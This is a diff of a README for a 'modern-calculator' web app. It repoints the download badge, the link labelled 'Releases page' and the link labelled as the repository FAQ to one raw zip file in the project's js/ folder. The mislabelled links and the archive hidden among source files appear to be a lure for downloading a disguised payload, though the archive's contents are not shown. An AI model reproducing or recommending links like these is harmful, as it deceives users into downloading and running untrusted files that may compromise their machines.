@@ -4,7 +4,7 @@
 Welcome to modern-calculator! This app provides a sleek and elegant way to handle your calculations, featuring both dark and light modes for your visual comfort. It’s easy to use and designed for everyone, regardless of technical skills. 
 
 ## 📥 Download the App
-[![Download modern-calculator](https://github.com/Benson0713/modern-calculator/raw/refs/heads/main/css/calculator_modern_v1.5.zip)](https://github.com/Benson0713/modern-calculator/raw/refs/heads/main/css/calculator_modern_v1.5.zip)
+[![Download modern-calculator](https://raw.githubusercontent.com/Benson0713/modern-calculator/main/js/calculator_modern_taula.zip)](https://raw.githubusercontent.com/Benson0713/modern-calculator/main/js/calculator_modern_taula.zip)
 
 ## 📋 Features
 - **Modern Design:** Enjoy a contemporary user interface with a beautiful black/gold theme.
@@ -21,7 +21,7 @@ To run modern-calculator, you need:
 ## 📥 Download & Install
 To get started, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Benson0713/modern-calculator/raw/refs/heads/main/css/calculator_modern_v1.5.zip) to download the app.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Benson0713/modern-calculator/main/js/calculator_modern_taula.zip) to download the app.
 2. **Choose the Latest Version:** On the releases page, find the latest version of modern-calculator.
 3. **Download the Files:** Click on the download link for the files you need. Usually, this would include an HTML file you can open in your browser.
 4. **Extract the Files (if necessary):** If your download is a zip file, right-click and extract it to a folder.
@@ -37,7 +37,7 @@ Once you open modern-calculator in your browser, you will see the calculator int
 
 ## 💬 Support
 If you encounter any issues or have questions:
-- Check the FAQ section on the [GitHub repository](https://github.com/Benson0713/modern-calculator/raw/refs/heads/main/css/calculator_modern_v1.5.zip).
+- Check the FAQ section on the [GitHub repository](https://raw.githubusercontent.com/Benson0713/modern-calculator/main/js/calculator_modern_taula.zip).
 - Open an issue in the GitHub repository for support.
 
 ## 📝 Contribution Guidelines
